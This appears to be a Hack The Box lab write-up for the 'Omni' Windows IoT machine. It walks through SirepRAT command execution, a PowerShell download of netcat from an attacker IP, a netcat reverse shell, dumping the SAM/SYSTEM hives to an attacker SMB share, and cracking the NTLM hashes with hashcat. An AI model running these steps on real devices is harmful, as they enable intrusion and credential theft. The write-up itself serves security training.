@@ -1,0 +1,286 @@
+Omni Notes
+
+IP: 10.10.10.204
+
+135/tcp  open  msrpc   Microsoft Windows RPC
+8080/tcp open  upnp    Microsoft IIS httpd
+
+
+We know it is a windows box, we are going to run -p- to see all ports
+
+A couple new ports are open so we investigate
+29817/tcp open  unknown
+29819/tcp open  unknown
+29820/tcp open  unknown
+
+Windows remoting is open, 5985. We also see the follwoing on port 8080
+8080/tcp open  upnp    Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+
+Windows Device Portal, this is most likely a windows iot device.
+
+If you google correctly yu will find a blackhat white paper descibing windows iot devices with default creds attached.
+
+We can try and enter the creds on the http site: User name: Administrator, Password: p@ssw0rd). 
+We dont get autentication next step is to find more info about the rest of the ports.
+
+For port 29820/tcp we immediately find a potential windows exploit in the SirepRAT a tool gainst windows IOT core
+
+We can run commands with no issues using the Sireprat tool we used:
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/SirepRAT]
+└──╼ $python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\hostname.exe" --return_output --v
+---------
+
+---------
+---------
+omni
+
+---------
+---------
+
+---------
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+<OutputStreamResult | type: 11, payload length: 6, payload peek: 'b'omni\r\n''>
+<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
+
+Since we can execute some commands but no interactive ones what we can do is upload a netcat binary unto the box and try and get execution
+
+We will try again with some slight modifications:
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/SirepRAT]
+└──╼ $python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell hostname" --return_output --v
+---------
+
+---------
+---------
+omni
+
+---------
+---------
+
+---------
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+<OutputStreamResult | type: 11, payload length: 6, payload peek: 'b'omni\r\n''>
+<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
+
+
+We can now attempt to download a file using powershell
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/SirepRAT]
+└──╼ $python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell IWR -Uri http://10.10.14.12:8000/nc64.exe -Outfile c:\nc64.exe" 
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
+
+
+
+We can now attempt to get a reverse shell by executing the command:
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/SirepRAT]
+└──╼ $python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c c:\nc64.exe -e powershell 10.10.14.12 9001" 
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+
+
+The output returned below:
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/SirepRAT]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.10.204] 49671
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32> whoami
+whoami
+
+
+We can run: dir env: 
+To look at all environment variables oncluding username
+
+If we tr and get access to the root.txt we cant seem to find it in its usual spot c:\Users/adminsitrator
+
+So we can go into the data directory and we can see there are moe of our usual directories installed.
+
+=========================================================================================================================================
+PS C:\Data\Users\administrator> ls
+ls
+
+
+    Directory: C:\Data\Users\administrator
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-r---         7/3/2020  11:23 PM                3D Objects                    
+d-r---         7/3/2020  11:23 PM                Documents                     
+d-r---         7/3/2020  11:23 PM                Downloads                     
+d-----         7/3/2020  11:23 PM                Favorites                     
+d-r---         7/3/2020  11:23 PM                Music                         
+d-r---         7/3/2020  11:23 PM                Pictures                      
+d-r---         7/3/2020  11:23 PM                Videos                        
+-ar---         7/4/2020   9:48 PM           1958 root.txt                      
+
+
+PS C:\Data\Users\administrator> type root.txt	
+type root.txt
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">flag</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+=========================================================================================================================================
+
+
+We can see that the root.txt is encoded so we will have to find a way to decrypt it. We can use cacl or pivot into the owner. As the ssystem 
+user we can dump the sam file and decrypt the passwords.
+
+We can use some registry commands to save the system and sam files to crack on our local machine.
+==========================================================================================================================================
+PS C:\Data\Users\administrator> reg save HKLM\SYSTEM c:\SYSTEM     
+reg save HKLM\SYSTEM c:\SYSTEM
+The operation completed successfully.
+PS C:\Data\Users\administrator> reg save HKLM\SAM c:\SAM
+reg save HKLM\SAM c:\SAM
+The operation completed successfully.
+
+==========================================================================================================================================
+
+Now we have to move the files to our system. We will use impacket for the file transfer: Apparently using smbpacket produces errors so the 
+next best thing to do is to switch from impacket to smb in our local machine by creating a new share:
+PS C:\> copy SAM \\10.10.14.12\test\sam
+copy SAM \\10.10.14.12\test\sam
+PS C:\> copy SYSTEM \\10.10.14.12\test\system
+copy SYSTEM \\10.10.14.12\test\system
+
+We also modified the samba config file to allow us to create the share to which we could drop the files:
+sudo vim /etc/samba/smb.conf
+==========================================================================================================================================
+[test]$
+   comment = Copy Filess$    
+   path = /home/user/htb/omni/smb$    
+   browseable = yes$    
+   read only = no$    
+   guest ok = yes$    
+
+
+
+After run the following:
+sudo service smbd start
+==========================================================================================================================================
+
+By ruuning impacket secrets dump we are able to get the hashes of the system and we can use john the ripper or hashcat to crack:
+==========================================================================================================================================
+╼ $impacket-secretsdump -system system -sam sam local
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
+sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
+DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
+app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
+[*] Cleaning up... 
+
+==========================================================================================================================================
+
+We only need the ntlm hashes so we can filter them out using awk.
+==========================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/omni/smb]
+└──╼ $cat hashes | awk -F: '{print $1":"$4}' > h
+==========================================================================================================================================
+
+We can now use hashcat:
+==========================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/smb]
+└──╼ $hashcat --force -m 1000 --user hashes /usr/share/wordlists/rockyou.txt
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/omni/smb]
+└──╼ $hashcat --force -m 1000 --user hashes /usr/share/wordlists/rockyou.txt --show
+Guest:31d6cfe0d16ae931b73c59d7e0c089c0:
+DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0:
+app:e3cb0651718ee9b4faffe19a51faff95:mesh5143
+
+==========================================================================================================================================
+
+As you can see we were able to crack the app user, we can either do windows remoting or check the http server and enter creds.
+
+We can now login using the app user and its password "mesh5143" on the website.
+
+So navigating the portal we look at the processes tab and we are able to see that we can run commands we can take advantage of that to execute
+the netcat binary. 
+==========================================================================================================================================
+c:\nc64.exe -e powershell.exe 10.10.14.12 9000
+
+==========================================================================================================================================
+
+Once we have gotten a foothold inside the the machine we can navigate to c:\data\users\app\ and try and read the user.txt we will first 
+have to decrypt using some windows voodoo.
+
+==========================================================================================================================================
+$ss = Import-CliXml -Path User.txt
+$ss.GetNetworkCredential().Flag
+
+$ss.GetNetworkCredential().Password
+
+PS C:\data\Users\app> $ss = Import-CliXml -Path User.txt
+$ss = Import-CliXml -Path User.txt
+PS C:\data\Users\app> $ss.GetNetworkCredential().Password
+$ss.GetNetworkCredential().Password
+7cfd50f6bc34db3204898f1505ad9d70
+
+
+==========================================================================================================================================
+
+we now have the string for the user.txt now we need it for th root.txt file, there is an iot xml file we can utilize so we look at the contents
+==========================================================================================================================================
+PS C:\data\Users\app> type iot-admin.xml 
+type iot-admin.xml 
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">omni\administrator</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+==========================================================================================================================================
+
+
+We apply the same logic and obtain the contents of the file:
+==========================================================================================================================================
+PS C:\data\Users\app> $ss = Import-CliXml -Path iot-admin.xml
+$ss = Import-CliXml -Path iot-admin.xml
+PS C:\data\Users\app> $ss.GetNetworkCredential().Password
+$ss.GetNetworkCredential().Password
+_1nt3rn37ofTh1nGz
+==========================================================================================================================================
+
+We can now use evil-winrm to gain remote access as the adminstraor user and obtain the root flag or use the same method as above using the
+web interface:
+==========================================================================================================================================
+PS C:\data\Users\administrator> $ss = Import-CliXml -Path root.txt
+$ss = Import-CliXml -Path root.txt
+PS C:\data\Users\administrator> $ss.GetNetworkCredential().Password
+$ss.GetNetworkCredential().Password
+5dbdce5569e2c4708617c0ce6e9bf11d
+==========================================================================================================================================
+
+We now have both of our hashes.
+
+Intresting bit to find 32 alphanumeric characters in a file:
+└──╼ $grep -r -E '^[a-z0-9]{32}$' notes.txt
